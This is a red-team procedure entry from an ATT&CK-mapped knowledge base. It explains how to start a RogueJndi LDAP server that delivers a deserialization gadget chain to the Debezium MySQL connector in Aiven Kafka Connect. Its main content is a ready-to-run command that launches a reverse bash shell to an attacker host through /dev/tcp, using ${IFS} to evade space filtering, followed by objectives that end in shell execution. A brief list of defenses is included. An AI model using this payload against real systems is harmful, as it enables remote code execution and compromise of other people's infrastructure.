---
id: proc-start-roguejndi
tags:
  - jndi
  - ldap
  - deserialization
type: procedure
tools:
  - '[[tools/RogueJndi]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/start-roguejndi-server]]'
verified: false
platforms:
  - Linux
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:49.649Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Start-Rogue-JNDI-LDAP-Server

## Summary

This procedure launches a rogue JNDI LDAP server using RogueJndi to serve malicious deserialization payloads, enabling RCE when the target connects via injected JNDI URL.

## Description

Targeted at the Debezium MySQL connector in Aiven Kafka Connect, this sets up an LDAP server that responds to JNDI queries with a gadget chain exploiting unsafe deserialization in Java/Scala. The payload uses a Scala System.setProperty gadget followed by CommonsCollections7 to execute a reverse bash shell. Requires Java runtime and the RogueJndi JAR.

## Requirements

1. Java 8+ installed on VPS
2. RogueJndi-1.1.jar downloaded
3. Attacker hostname/IP resolvable and reachable
4. Port 389 (LDAP) open outbound from target

## Defense

Defensive measures and detection strategies:

- Disable JNDI in JAAS configs or restrict to trusted providers
- Validate connector properties for external URLs
- Monitor for unexpected outbound LDAP connections
- Use allowlists for JNDI lookups

## Objectives

1. Host malicious LDAP reference for JNDI injection
2. Deliver deserialization gadget chain on query
3. Trigger reverse shell execution on target

## Instructions

### Step 1: Launch RogueJndi Server

**Context**: Start the server configured with the reverse shell command to respond to LDAP lookups.

**Command** ([[commands/start-roguejndi-server]]):
```bash
java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"
```

> The --hostname flag sets the server address (redacted), and -c defines the payload using bash with ${IFS} to bypass space restrictions, connecting back to attacker's IP on port 4445. Expected output: "RogueJndi started on 0.0.0.0:1389" or similar, indicating readiness.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/start-roguejndi-server]]

## Tools Used

- [[tools/RogueJndi]]

## Tags

- jndi
- ldap
- deserialization
